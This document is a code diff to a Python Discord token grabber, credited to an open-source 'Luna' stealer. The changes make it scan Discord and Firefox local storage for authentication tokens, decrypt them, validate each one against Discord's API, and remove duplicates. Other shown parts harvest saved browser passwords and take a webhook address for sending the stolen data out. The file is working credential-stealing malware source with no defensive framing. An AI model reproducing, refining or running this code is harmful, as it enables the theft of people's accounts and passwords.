@@ -19,6 +19,9 @@ roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 encrypt_regex = r"dQw4w9WgXcQ:[^\"]*"
 normal_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+baseurl = "https://discord.com/api/v9/users/@me"
+tokens = []
+ids = []
 
 paths = {
     "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
@@ -92,62 +95,83 @@ def get_key(path):
 for name, path in paths.items():
     if not os.path.exists(path):
         continue
-    _discord = name.replace(" ", "").lower()  # thx addix for space thing fix idk
+    disc = name.replace(" ", "").lower()
     if "cord" in path:
-        if not os.path.exists(roaming + f"\\{_discord}\\Local State"):
-            continue
-        for file_stuff in os.listdir(path):
-            if file_stuff[-3:] not in ["log", "ldb"]:
-                continue
-            for line in [
-                x.strip()
-                for x in open(f"{path}\\{file_stuff}", errors="ignore").readlines()
-                if x.strip()
-            ]:
-                for i in findall(encrypt_regex, line):
-                    token = decrypt_val(
-                        b64decode(i.split("dQw4w9WgXcQ:")[1]),
-                        get_key(roaming + f"\\{_discord}\\Local State"),
-                    )
-                    all_tokens.append(token)
+        if os.path.exists(roaming + f"\\{disc}\\Local State"):
+            for file_name in os.listdir(path):
+                if file_name[-3:] not in ["log", "ldb"]:
+                    continue
+                for line in [
+                    x.strip()
+                    for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
+                    if x.strip()
+                ]:
+                    for y in findall(encrypt_regex, line):
+                        token = decrypt_val(
+                            b64decode(y.split("dQw4w9WgXcQ:")[1]),
+                            get_key(roaming + f"\\{disc}\\Local State"),
+                        )
+                        r = get(
+                            baseurl,
+                            headers={
+                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                                "Content-Type": "application/json",
+                                "Authorization": token,
+                            },
+                        )
+                        if r.status_code == 200:
+                            uid = r.json()["id"]
+                            if uid not in ids:
+                                tokens.append(token)
+                                ids.append(uid)
     else:
-        for file_stuff in os.listdir(path):
-            if file_stuff[-3:] not in ["log", "ldb"]:
+        for file_name in os.listdir(path):
+            if file_name[-3:] not in ["log", "ldb"]:
                 continue
             for line in [
                 x.strip()
-                for x in open(f"{path}\\{file_stuff}", errors="ignore").readlines()
+                for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                 if x.strip()
             ]:
-                for i in findall(normal_regex, line):
-                    all_tokens.append(i)
-
+                for token in findall(normal_regex, line):
+                    r = get(
+                        baseurl,
+                        headers={
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                            "Content-Type": "application/json",
+                            "Authorization": token,
+                        },
+                    )
+                    if r.status_code == 200:
+                        uid = r.json()["id"]
+                        if uid not in ids:
+                            tokens.append(token)
+                            ids.append(uid)
 
 if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
-    for path, dirs, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
-        for new_file in files:
-            if not new_file.endswith(".sqlite"):
+    for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
+        for _file in files:
+            if not _file.endswith(".sqlite"):
                 continue
             for line in [
                 x.strip()
-                for x in open(f"{path}\\{new_file}", errors="ignore").readlines()
+                for x in open(f"{path}\\{_file}", errors="ignore").readlines()
                 if x.strip()
             ]:
-                for token in findall(encrypt_regex, line):
-                    all_tokens.append(token)
-
-working = []
-for token in all_tokens:
-    url = "https://discord.com/api/v9/users/@me"
-    r = get(url, headers={"Authorization": token})
-    if r.status_code == 200:
-        # check if token is already in list
-        if token in working:
-            continue
-        else:
-            working.append(token)
-
-print(working)
+                for token in findall(normal_regex, line):
+                    r = get(
+                        baseurl,
+                        headers={
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+                            "Content-Type": "application/json",
+                            "Authorization": token,
+                        },
+                    )
+                    if r.status_code == 200:
+                        uid = r.json()["id"]
+                        if uid not in ids:
+                            tokens.append(token)
+                            ids.append(uid)
 
 # ++++++++++++++++++ FULL CREDIT TO SMUG FOR EVERYTHING BELOW THIS https://github.com/Smug246/Luna-Token-Grabber +++++++++++++++++++++++
 
@@ -155,7 +179,6 @@ print(working)
 class browsers:
     def __init__(self) -> None:
         self.appdata = os.getenv("LOCALAPPDATA")
-        self.roaming = os.getenv("APPDATA")
         self.browsers = {
             "amigo": self.appdata + "\\Amigo\\User Data",
             "torch": self.appdata + "\\Torch\\User Data",
@@ -236,7 +259,7 @@ class browsers:
                         )
                     )
                 else:
-                    f.write("No passwords were found :(")
+                    pass
         cursor.close()
         conn.close()
         os.remove("Loginvault.db")
@@ -368,7 +391,7 @@ if __name__ == "__main__":
     webhook = argv[1]
     remove_dup = [*set(all_tokens)]
     with open("tokens.txt", "a+", encoding="utf-8", errors="ignore") as f:
-        for item in working:
+        for item in tokens:
             f.write(f"{item}\n")
     threads = [browsers, ss]
     for thread in threads:
